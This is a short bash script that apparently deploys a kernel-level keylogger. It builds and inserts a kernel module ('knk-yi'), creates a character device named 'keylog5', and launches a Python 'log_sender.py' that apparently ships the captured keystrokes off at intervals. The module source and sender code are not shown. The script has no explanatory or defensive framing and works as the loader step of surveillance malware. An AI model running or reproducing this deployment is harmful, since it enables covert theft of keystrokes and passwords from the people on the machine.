#!/bin/bash

#GLOBAL VARS
#set -e
FILE_TO_BUILD='knk-yi'
DEVICE='keylog5'

#build the module
echo "cleaning"
make clean
rm -f keylog*
rmmod "$FILE_TO_BUILD"
echo "Builind"
#make -f "$FILE_TO_BUILD".c
make
#load module & create inode
insmod "$FILE_TO_BUILD".ko
echo "waiting to get MAJOR"
sleep 9s
#GET MAJOR MINOR
#MAJOR=$(ls -ln keylog5 \| cut -d \' \' -f 5 \| sed -r \'s/[,]+/ /g\')
mknod "$DEVICE" c 244 0


#run python on background
echo "Running script"
$(which python3) log_sender.py -f keylog5 -t 5

